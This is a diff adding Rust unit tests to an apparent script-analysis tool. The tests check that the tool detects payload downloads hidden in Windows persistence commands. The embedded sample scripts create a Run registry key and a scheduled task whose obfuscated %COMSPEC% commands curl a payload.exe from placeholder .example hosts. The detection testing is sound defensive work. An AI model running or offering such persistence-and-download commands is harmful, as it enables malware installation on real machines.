@@ -2496,6 +2496,26 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "cmd 
     }
 
     #[test]
+    fn reg_add_comspec_run_key_recurses_with_delayed_expansion() {
+        let script = br#"@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "%COMSPEC% /V:ON /c set U=https://reg-comspec.example/payload.exe&&curl -o payload.exe !U!" /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://reg-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "persisted COMSPEC Run-key command download missing: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn powershell_run_key_itemproperty_emits_persistence_trait() {
         let script = br#"powershell -Command "New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Updater -Value 'cmd.exe /c calc.exe' -PropertyType String -Force"
 "#;
@@ -3148,6 +3168,26 @@ powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [S
             assert_eq!(key, "VCC_runner2");
             assert!(command.contains("C:\\evil.exe"));
         }
+    }
+
+    #[test]
+    fn schtasks_comspec_task_run_recurses_with_delayed_expansion() {
+        let script = br#"@echo off
+schtasks /create /tn Updater /tr "%COMSPEC% /V:ON /c set U=https://schtasks-comspec.example/payload.exe&&curl -o payload.exe !U!" /sc once /st 00:00 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://schtasks-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "persisted COMSPEC scheduled-task command download missing: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
     }
 
     #[test]
